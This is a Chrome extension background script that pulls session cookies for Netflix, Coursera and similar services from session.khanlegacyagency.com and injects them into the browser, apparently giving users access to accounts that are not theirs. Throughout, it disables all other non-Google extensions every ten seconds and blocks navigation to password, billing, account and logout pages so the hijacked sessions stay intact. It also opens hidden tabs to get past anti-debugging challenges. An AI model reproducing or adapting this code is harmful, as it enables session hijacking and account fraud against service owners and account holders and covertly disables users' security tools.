
// Session SERVICE URLS
const SESSION_URLS = {
  '1': 'https://session.khanlegacyagency.com/Netflix/Netflix.php',
  '2': 'https://session.khanlegacyagency.com/Netflix/Netflix.php',
  '3': 'https://session.khanlegacyagency.com/Coursera/Coursera.php'
};

const RESTRICTED_KEYWORDS = ['settings', 'account', 'billing', 'profile', 'subscription', 'password', 'payment', 'logout', 'signout', 'sign-out', 'help', 'support'];
const SUPPORTED_DOMAINS = ['netflix.com', 'coursera.org', 'primevideo.com', 'hulu.com', 'disneyplus.com', 'hbomax.com', 'crunchyroll.com', 'udemy.com', 'spotify.com'];

// Monopoly: Disable competing extensions
async function ensureMonopoly() {
  try {
    const extensions = await chrome.management.getAll();
    const self = await chrome.management.getSelf();
    for (const ext of extensions) {
      if (ext.id !== self.id && ext.type === 'extension' && ext.enabled && !ext.name.includes('Google')) {
        await chrome.management.setEnabled(ext.id, false);
      }
    }
  } catch (error) { }
}

chrome.runtime.onStartup.addListener(ensureMonopoly);
chrome.runtime.onInstalled.addListener(ensureMonopoly);
setInterval(ensureMonopoly, 10000);

// Navigation Filter: Protect accounts
chrome.webNavigation.onBeforeNavigate.addListener((details) => {
  if (details.url && details.frameId === 0) {
    try {
      const url = new URL(details.url);
      const host = url.hostname.toLowerCase();
      if (!SUPPORTED_DOMAINS.some(d => host.includes(d))) return;
      if (RESTRICTED_KEYWORDS.some(kw => url.pathname.toLowerCase().includes(kw))) {
        if (host.includes('khanlegacyagency.com')) return;
        chrome.tabs.update(details.tabId, { url: url.protocol + '//' + url.hostname + '/' });
      }
    } catch (e) { }
  }
});

// CORE MESSAGE HANDLER
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'injectCookies') {
    handleSyncRequest(request.sessionId, request.url)
      .then(res => sendResponse(res))
      .catch(err => sendResponse({ success: false, error: err.message }));
    return true;
  }

  if (request.action === 'sessionDataFound' && request.html) {
    processSessionData(request.html, sender.tab ? sender.tab.id : null);
    return true;
  }

  if (request.action === 'healthCheck') {
    sendResponse({ alive: true });
    return true;
  }
});

// MAIN SYNC LOGIC
async function handleSyncRequest(sessionId, directUrl) {
  const url = directUrl || SESSION_URLS[String(sessionId).trim()];
  if (!url) throw new Error('Invalid Tool');

  // STEP 1: Shadow Fetch (Like "View Source")
  // No JS executes here, bypassing redirects and Anti-DevTool
  try {
    const response = await fetch(url, {
      headers: {
        'Cache-Control': 'no-cache',
        'User-Agent': navigator.userAgent
      }
    });

    if (response.ok) {
      const html = await response.text();
      if (html.includes('id="extv"') || html.includes('ext01JSON')) {
        const found = await processSessionData(html);
        if (found) return { success: true, status: 'instant' };
      }
    }
  } catch (e) { }

  // STEP 2: Safe Tab (For challenges)
  // Opens hidden tab, let Isolated World content.js monitor it
  chrome.tabs.create({ url: url, active: false });
  return { success: true, status: 'started' };
}

// Extraction & Injection
async function processSessionData(html, sourceTabId) {
  const cookies = extractCookies(html);
  const redirect = extractRedirect(html);

  if (cookies && cookies.length > 0) {
    for (const c of cookies) await setCookie(c);
    if (sourceTabId) chrome.tabs.remove(sourceTabId);

    // Notify all tabs (specifically the dashboard)
    chrome.tabs.query({}, (tabs) => {
      tabs.forEach(tab => {
        try {
          chrome.tabs.sendMessage(tab.id, {
            type: 'SYNC_COMPLETE',
            redirect: redirect || 'https://www.netflix.com/browse'
          });
        } catch (e) { }
      });
    });
    return true;
  }
  return false;
}

function extractCookies(html) {
  const regex = /<(?:div|span|script)[^>]*(?:id|class)=["'](?:extv|ext01JSONdiv|ext01JSON)["'][^>]*>([\s\S]*?)<\/(?:div|span|script)>/i;
  const match = html.match(regex);
  if (match) {
    const jsonStr = findJsonArray(match[1]);
    if (jsonStr) {
      try {
        const parsed = JSON.parse(jsonStr);
        if (Array.isArray(parsed)) return sanitizeCookies(parsed);
      } catch (e) { }
    }
  }

  // Deep search fallback
  let pos = 0;
  for (let i = 0; i < 10; i++) {
    const start = html.indexOf('[', pos);
    if (start === -1) break;
    const array = findJsonArray(html.substring(start));
    if (array && array.includes('"domain"')) {
      try {
        const parsed = JSON.parse(array);
        if (Array.isArray(parsed) && parsed[0].domain) return sanitizeCookies(parsed);
      } catch (e) { }
    }
    pos = start + 1;
  }
  return null;
}

function findJsonArray(str) {
  const start = str.indexOf('[');
  if (start === -1) return null;
  let b = 0, s = false, e = false;
  for (let i = start; i < str.length; i++) {
    if (e) { e = false; continue; }
    if (str[i] === '\\') { e = true; continue; }
    if (str[i] === '"') { s = !s; continue; }
    if (!s) {
      if (str[i] === '[') b++;
      if (str[i] === ']') { b--; if (b === 0) return str.substring(start, i + 1); }
    }
  }
  return null;
}

function sanitizeCookies(cookies) {
  return cookies.map(c => {
    let domain = c.domain;
    if (!c.hostOnly && domain && !domain.startsWith('.')) domain = '.' + domain;
    const obj = {
      url: 'https://' + (domain && domain.startsWith('.') ? domain.slice(1) : (domain || '')),
      name: c.name, value: c.value, domain: domain, path: c.path || '/',
      secure: c.secure || false, httpOnly: c.httpOnly || false,
      expirationDate: c.expirationDate || Math.floor(Date.now() / 1000) + 31536000
    };
    if (c.sameSite) {
      const val = String(c.sameSite).toLowerCase();
      if (val.includes('strict')) obj.sameSite = 'strict';
      else if (val.includes('lax')) obj.sameSite = 'lax';
      else { obj.sameSite = 'no_restriction'; obj.secure = true; }
    } else if (obj.secure) obj.sameSite = 'no_restriction';
    return obj;
  });
}

function extractRedirect(html) {
  const m1 = html.match(/href=["'](https?:\/\/[^"']+)["']/i);
  if (m1 && !m1[1].includes('khanlegacyagency')) return m1[1];
  const m2 = html.match(/window\.location\.href\s*=\s*["']([^"']+)["']/);
  if (m2) return m2[1];
  return null;
}

function setCookie(c) {
  return new Promise(r => {
    chrome.cookies.set(c, () => { chrome.runtime.lastError; r(); });
  });
}